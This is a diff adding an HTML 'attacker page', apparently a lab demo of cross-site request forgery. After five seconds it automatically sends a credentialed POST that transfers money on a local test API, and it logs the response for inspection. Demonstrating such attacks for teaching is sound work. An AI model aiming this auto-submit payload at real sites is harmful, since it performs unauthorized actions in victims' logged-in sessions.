@@ -1,0 +1,52 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>Evil demo (debug)</title>
+  <style>
+    body { font-family: Arial, sans-serif; padding: 30px; }
+    .log { background:#f6f6f6; padding:12px; border:1px solid #ddd; max-width:700px; }
+  </style>
+</head>
+<body>
+  <h1>Attacker page (evil.html) — debug mode</h1>
+  <p>This page demonstrates an auto-POST to the API. It now waits 5 seconds so you can inspect before submit.</p>
+
+  <div class="log" id="status">Status: waiting to submit...</div>
+
+  <form id="evilForm" action="http://localhost:5187/api/transfer" method="POST">
+    <input type="hidden" name="amount" value="100">
+    <button type="button" id="btnSubmit">Submit now</button>
+  </form>
+
+  <script>
+    // show cookie & origin info (won't show HttpOnly cookies)
+    document.getElementById('status').innerText += "\nOrigin: " + location.origin + "\nSubmitting in 5s...";
+    // auto-submit after 5s so you can open DevTools / Network
+    setTimeout(() => {
+      document.getElementById('status').innerText += "\nAuto-submitting now...";
+      // Uncomment next line to auto submit. For debug we call fetch so we can show result.
+      fetch(document.getElementById('evilForm').action, {
+        method: 'POST',
+        credentials: 'include', // include cookies
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ amount: 100 })
+      })
+      .then(async r => {
+        document.getElementById('status').innerText += "\\nResponse: " + r.status + " " + r.statusText;
+        const t = await r.text();
+        document.getElementById('status').innerText += "\\nBody: " + (t && t.length>200 ? t.slice(0,200) + '...' : t);
+      })
+      .catch(e => {
+        document.getElementById('status').innerText += "\\nFetch error: " + e.message;
+      });
+    }, 5000);
+
+    // manual submit button if you want
+    document.getElementById('btnSubmit').addEventListener('click', () => {
+      document.getElementById('status').innerText += "\\nManual submit pressed.";
+      document.getElementById('evilForm').submit();
+    });
+  </script>
+</body>
+</html>
